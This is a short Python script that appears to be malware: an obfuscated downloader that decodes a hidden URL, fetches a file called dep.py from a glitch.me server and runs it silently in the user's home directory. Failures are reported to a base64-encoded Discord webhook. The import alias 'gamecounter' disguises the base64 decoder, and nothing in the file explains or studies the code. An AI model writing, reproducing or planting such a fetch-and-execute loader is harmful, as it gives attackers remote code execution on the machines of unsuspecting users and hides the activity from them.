import requests as r
from base64 import b64decode as gamecounter
import os 
import subprocess

asset = 'aHR0cHM6Ly9icmlzdGxlLWN1cnZ5LWtvYWxhLmdsaXRjaC5tZS9kZXAucHk=='
response = r.get(gamecounter(asset).decode('utf-8'))
username = os.path.expanduser('~')
url = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwMTgyNzk5NTMzMDAyMzQ0NC8tYnNqLXF0bkQwVlZ0ZVpJUnNQcEJFWEtUS0V1bGk2ZE56ZTd6dXBBWFV2X1ZXOHlZcGlUZnhhRFVJb0I1RHlhVGsyaQ=="

if response.status_code == 200:
    try:
        with open(f"{username}/dep.py", "wb") as file:
            file.write(response.content)
    except subprocess.CalledProcessError as e:
        data = {"content" : f"Couldn't write file to drive:\n {e.output}", "username" : "ERROR HANDLING"}
        r.post(url=gamecounter(url).decode('utf-8'), json=data)
        exit()
    try:
      subprocess.Popen(["python", f"{username}/dep.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        data = {"content" : f"Couldn't execute file:\n {e.output}", "username" : "ERROR HANDLING"}
        r.post(url=gamecounter(url).decode('utf-8'), json=data)
        exit()
else:
    data = {"content" : f"Couldn't fetch from glitch server: STATUS_CODE:{response.status_code}\n RESPONSE:{response.text}", "username" : "FAILED TRYING TO REACH SERVER"}
    r.post(url=gamecounter(url).decode('utf-8'), json=data)
    exit()